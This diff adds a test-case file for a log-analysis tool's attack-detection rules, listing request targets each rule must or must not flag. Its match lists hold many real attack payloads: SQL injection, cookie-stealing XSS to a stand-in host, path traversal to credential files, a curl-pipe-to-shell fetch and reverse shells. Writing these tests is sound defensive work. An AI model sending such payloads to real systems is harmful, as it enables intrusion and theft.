@@ -1,0 +1,448 @@
+# Test cases for every rule in src/loginsight/detection/rules/default.toml.
+#
+# One table per rule id, with two lists of request targets (path plus query):
+#   match     requests the rule MUST catch (at least 2),
+#   no_match  requests that share the rule's words but are NOT attacks, so the rule must
+#             leave them alone (at least 3).
+#
+# tests/detection/test_rule_cases.py fails if a rule has too few cases, if a case is not
+# handled the way it says, or if a table names a rule that no longer exists. Write attack
+# examples from the technique (cheat sheets), not copied from scripts/generate_logs.py.
+
+[sqli-union-select]
+match = [
+  "/item?id=-1 UNION ALL SELECT NULL,NULL,version()--",
+  "/item?id=1/**/UNION/**/SELECT/**/1,2",
+  "/item?id=1 uNiOn aLl sElEcT 1,@@version",
+  "/item?id=0'+union+select+user,pass+from+admin--+",
+  "/item?id=1/**/UNION/**/ALL/**/SELECT/**/1",
+]
+no_match = [
+  "/s?q=union+of+committee",
+  "/s?q=onion+select",
+  "/s?q=union.select",
+]
+
+[sqli-tautology]
+match = [
+  "/login?user=' or '1'='1",
+  "/login?user=admin' or 1=1#",
+  "/login?user=') or ('a'='a",
+  "/login?user=\" or \"\"=\"",
+  "/login?user='or'1'='1",
+  "/item?id=5 or 1=1",
+  "/item?id=5 AND 7=7",
+  "/login?u=x' and 1=2 union select 1",
+  "/item?id=1' OR 'x' LIKE 'x",
+  "/item?id=1'||'a'='a",
+  "/item?id=1' or/**/1=1",
+  "/item?id=5/**/or/**/7=7",
+  "/item?id=1'/**/and/**/'a'='a",
+  "/item?id=1 having 1=1",
+]
+no_match = [
+  "/s?q=o'brien",
+  "/s?q=rock'n'roll",
+  "/s?q=1+or+2",
+  "/api?filter={\"or\":[1]}",
+]
+
+[sqli-quote-comment]
+match = [
+  "/login?user=admin'-- -",
+  "/login?user=admin'#",
+  "/login?user=admin')/*",
+  "/login?user=admin\" --",
+]
+no_match = [
+  "/s?q=it's+fine",
+  "/s?q=5+--+3",
+  "/s?q=a%23b",
+]
+
+[sqli-time-delay]
+match = [
+  "/item?id=1;SELECT SLEEP(10)",
+  "/item?id=1' AND pg_sleep(5)--",
+  "/item?id=1;WAITFOR DELAY '0:0:5'--",
+  "/item?id=1 AND BENCHMARK(5000000,MD5(1))",
+  "/item?id=1 and 1=dbms_pipe.receive_message('a',5)",
+]
+no_match = [
+  "/s?q=sleep+well",
+  "/s?q=sleep+8+hours",
+  "/s?q=benchmark+results",
+]
+
+[sqli-information-schema]
+match = [
+  "/item?id=1 union select table_name from information_schema.tables",
+  "/item?id=1 and (select count(*) from sqlite_master)>0",
+  "/item?id=1 union select load_file('/etc/hostname')",
+  "/item?id=1 and 1=(select count(*) from sysobjects)",
+  "/item?id=1 and (select count(*) from mysql.user)>0",
+  "/item?id=1 and exists(select 1 from sys.tables)",
+  "/item?id=1 into outfile '/var/www/html/x.php'",
+  "/item?id=1 into dumpfile '/tmp/x'",
+]
+no_match = [
+  "/s?q=information+schema+design",
+  "/s?q=schema.org",
+  "/s?q=load+file",
+]
+
+[sqli-stacked-statement]
+match = [
+  "/item?id=1; DROP TABLE users--",
+  "/item?id=1;DELETE FROM sessions",
+  "/item?id=1'; EXEC xp_cmdshell 'dir'--",
+  "/item?id=1;UPDATE users SET admin=1",
+  "/item?id=1 and 1=xp_cmdshell('whoami')",
+]
+no_match = [
+  "/s?q=drop+table+tennis",
+  "/s?q=a;b",
+  "/v1;x",
+]
+
+[xss-script-tag]
+match = [
+  "/s?q=<script>document.location='http://x.test/?c='+document.cookie</script>",
+  "/s?q=<ScRiPt>prompt(1)</ScRiPt>",
+  "/s?q=<script src=//x.test/a.js>",
+  "/s?q=</script><script>alert(1)",
+]
+no_match = [
+  "/blog/how-to-use-script-tags-in-email",
+  "/s?q=a<b",
+  "/s?q=scripture",
+]
+
+[xss-event-handler-in-tag]
+match = [
+  "/s?q=<body onload=alert(1)>",
+  "/s?q=<svg/onload=confirm(1)>",
+  "/s?q=<input autofocus onfocus=alert(1)>",
+  "/s?q=<details open ontoggle=alert(1)>",
+  "/s?q=<img src=x onerror=alert(1)>",
+  "/s?q=<video><source onerror=alert(1)>",
+]
+no_match = [
+  "/s?q=<b>bold</b>",
+  "/p?onload=1",
+  "/s?q=<a href=x>link</a>",
+]
+
+[xss-event-handler-after-quote]
+match = [
+  "/s?q=x\" onmouseover=\"alert(1)",
+  "/s?q=x'onerror='alert(1)",
+  "/s?q=x\"/onfocus=alert(1)//",
+  "/s?q=x'+onmouseover=alert(1)+'",
+]
+no_match = [
+  "/p?onclick=1",
+  "/s?q=it's+online",
+  "/api?x=1&onerror=0",
+]
+
+[xss-script-uri]
+match = [
+  "/go?next=javascript:alert(document.domain)",
+  "/go?next=JaVaScRiPt:%0aalert(1)",
+  "/go?next=data:text/html,<b>x</b>",
+  "/go?next=vbscript:msgbox(1)",
+]
+no_match = [
+  "/s?q=javascript:+the+good+parts",
+  "/s?q=javascript+tutorial",
+  "/s?q=data+science",
+]
+
+[xss-embedding-tag]
+match = [
+  "/s?q=<iframe src=//x.test>",
+  "/s?q=<object data=x.swf>",
+  "/s?q=<meta http-equiv=refresh content=0;url=//x.test>",
+  "/s?q=<embed src=x>",
+  "/s?q=<base href=//x.test/>",
+]
+no_match = [
+  "/s?q=<b>iframe</b>",
+  "/s?q=iframe+tutorial",
+  "/s?q=meta+tags+guide",
+]
+
+[traversal-dotdot]
+match = [
+  "/get?f=../../../../windows/system.ini",
+  "/get?f=..%2f..%2f..%2fapp/config",
+  "/get?f=%2e%2e%5c%2e%2e%5csecret.txt",
+  "/get?f=%252e%252e%252f%252e%252e%252fx",
+  "/static/..;/admin",
+  "/get?f=....//....//x",
+  "/static/css/..",
+  "/get?f=..%00/..%00/x",
+]
+no_match = [
+  "/a..b/c",
+  "/download?file=my..report.pdf",
+  "/s?q=wait...",
+]
+
+[traversal-sensitive-file]
+match = [
+  "/get?f=/etc/passwd",
+  "/get?f=/proc/self/environ",
+  "/get?f=C:\\Windows\\System32\\drivers\\etc\\hosts",
+  "/get?f=/var/log/auth.log",
+  "/get?f=%2Fetc%2Fshadow",
+  "/get?f=..\\..\\boot.ini",
+  "/get?f=windows/system32/notepad.exe",
+  "/get?f=c:/winnt/system32/config/sam",
+  "/get?f=c:\\windows\\system32\\cmd.exe",
+]
+no_match = [
+  "/docs/etc-hosts-explained",
+  "/s?q=etc+hosts",
+  "/darwin.ini",
+]
+
+[traversal-file-wrapper]
+match = [
+  "/get?page=php://filter/convert.base64-encode/resource=index",
+  "/get?page=expect://id",
+  "/get?page=file:///etc/hostname",
+  "/get?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=",
+  "/get?page=phar://upload/a.jpg/x",
+]
+no_match = [
+  "/s?q=file+upload",
+  "/s?q=zip+code",
+  "/s?q=data+science",
+]
+
+[cmdi-separator-command]
+match = [
+  "/run?host=8.8.8.8;uname -a",
+  "/run?host=8.8.8.8|nc 1.2.3.4 99",
+  "/run?host=8.8.8.8&&cat /etc/hostname",
+  "/run?host=8.8.8.8||whoami",
+  "/run?host=$(id)",
+  "/run?host=`hostname`",
+  "/run?host=x;curl http://x.test/s.sh|sh",
+  "/run?host=x%0a%3Bwhoami",
+  "/run?host=x;ping -c 1 10.0.0.1",
+]
+no_match = [
+  "/a?x=1&id=5",
+  "/a;id=5",
+  "/a?tags=red|blue|green",
+  "/s?q=cat+food",
+]
+
+[cmdi-shell-path]
+match = [
+  "/run?c=/bin/bash -c ls",
+  "/run?c=cmd.exe /c dir",
+  "/run?c=powershell -nop -c whoami",
+  "/run?c=/usr/bin/env python",
+  "/run?c=/bin/sh",
+]
+no_match = [
+  "/bin/shop",
+  "/products/bin/shoes",
+  "/s?q=cmd+line",
+]
+
+[cmdi-reverse-shell]
+match = [
+  "/run?c=bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+  "/run?c=nc -lvp 4444 -e /bin/sh",
+  "/run?c=cat${IFS}/etc/hostname",
+  "/run?c=mkfifo /tmp/f",
+  "/run?c=socat tcp:10.0.0.1:99 exec:sh",
+  "/run?c=exec 3<>/dev/tcp/10.0.0.1/80",
+  "/run?c=bash -i",
+]
+no_match = [
+  "/s?q=dev+tcp",
+  "/s?q=nc+cable",
+  "/s?q=bash+scripting",
+]
+
+[probe-env-file]
+match = [
+  "/.env.production",
+  "/.env.local",
+  "/app/.env",
+  "/api/v1/.env.staging",
+  "/.ENV",
+  "/.env.bak",
+  "/.env?cache=1",
+  "/.env/",
+  "/.env;.jpg",
+  "/%2eenv",
+]
+no_match = [
+  "/environment",
+  "/blog/using-env-files",
+  "/.envelope",
+  "/.environment",
+  "/env",
+]
+
+[probe-secret-file]
+match = [
+  "/.aws/config",
+  "/.ssh/id_rsa",
+  "/id_ed25519.pub",
+  "/.ssh/authorized_keys",
+  "/.htpasswd",
+  "/admin/.htaccess",
+  "/config/secrets.yml",
+  "/credentials.json",
+  "/wp-config.php~",
+  "/wp-config.old",
+  "/wp-config.php.save",
+  "/configuration.php.orig",
+  "/.npmrc",
+  "/.pgpass",
+  "/.bash_history",
+  "/.git-credentials",
+  "/.htpasswd?v=2",
+  "/.htpasswd;x=1",
+  "/.npmrc?x",
+]
+no_match = [
+  "/credentials",
+  "/credentials-policy",
+  "/secret-santa",
+  "/ssh-keys-guide",
+  "/id_card",
+]
+
+[probe-vcs-dir]
+match = [
+  "/.git/HEAD",
+  "/.git",
+  "/old/.git/config",
+  "/.svn/entries",
+  "/.hg/store",
+  "/.bzr/branch",
+  "/.DS_Store",
+  "/images/.DS_Store",
+  "/.git;/config",
+  "/CVS/Entries",
+  "/cvs/root",
+  "/CVS/Repository",
+  "/CVS/Entries?x=1",
+  "/CVS/Entries;x",
+  "/CVS/Root/",
+  "/.DS_Store?v=1",
+  "/.DS_Store;x",
+  "/.git?x",
+]
+no_match = [
+  "/.github/workflows/ci.yml",
+  "/.gitignore",
+  "/git/intro",
+  "/svn-vs-git",
+  "/cvs/intro",
+  "/cvs-tutorial",
+  "/github/readme",
+]
+
+[probe-backup-archive]
+match = [
+  "/backup.sql",
+  "/db.sql",
+  "/dump.sql.gz",
+  "/site.tar.gz",
+  "/www.zip",
+  "/database.sql",
+  "/db_backup_2025-10-27.tgz",
+  "/site-backup.rar",
+  "/wwwroot.7z",
+  "/public_html.zip",
+  "/index.php.bak",
+  "/config.old",
+  "/index.php.orig",
+  "/.index.php.swp",
+  "/index.php~",
+  "/BACKUP.ZIP",
+  "/backup.zip;jsessionid=1",
+  "/index.php.save",
+  "/index.php.backup",
+  "/index.php.bak?x=1",
+  "/config.old;x",
+  "/index.php~?x=1",
+  "/index.php~;x",
+  "/bak.zip",
+  "/htdocs.zip",
+  "/export.sql",
+  "/site.tar",
+  "/site.bz2",
+  "/db.dump",
+  "/db.sql?dl=1",
+  "/db.sql;x",
+]
+no_match = [
+  "/products/backup-power-supply",
+  "/downloads/app-v2.zip",
+  "/files/report.zip",
+  "/files/photos.tar.gz",
+  "/old/spring-sale",
+  "/backup",
+  "/backup.html",
+  "/db",
+  "/sitemap.xml",
+  "/~user/page.html",
+]
+
+[probe-diagnostics]
+match = [
+  "/phpinfo",
+  "/info.php",
+  "/server-status",
+  "/server-info",
+  "/server-status?auto",
+  "/actuator/env",
+  "/actuator/heapdump",
+  "/_profiler/",
+  "/elmah.axd",
+  "/debug/pprof/",
+  "/phpinfo.php5",
+  "/trace.axd",
+  "/_debugbar/open",
+]
+no_match = [
+  "/blog/what-is-phpinfo",
+  "/docs/server-status-codes",
+  "/server-side-rendering",
+  "/actuator/health",
+  "/actuator/info",
+]
+
+[probe-admin-panel]
+match = [
+  "/wp-login.php",
+  "/wp-admin/",
+  "/wp-admin/install.php",
+  "/xmlrpc.php",
+  "/phpmyadmin",
+  "/phpMyAdmin/index.php",
+  "/phpmyadmin-4.9.0/",
+  "/pma/",
+  "/myadmin/",
+  "/adminer.php",
+  "/manager/html",
+]
+no_match = [
+  "/admin-guide",
+  "/blog/phpmyadmin-tutorial",
+  "/docs/xmlrpc-explained",
+  "/pma-results",
+  "/wp-content/uploads/a.jpg",
+  "/wp-json/wp/v2/posts",
+]
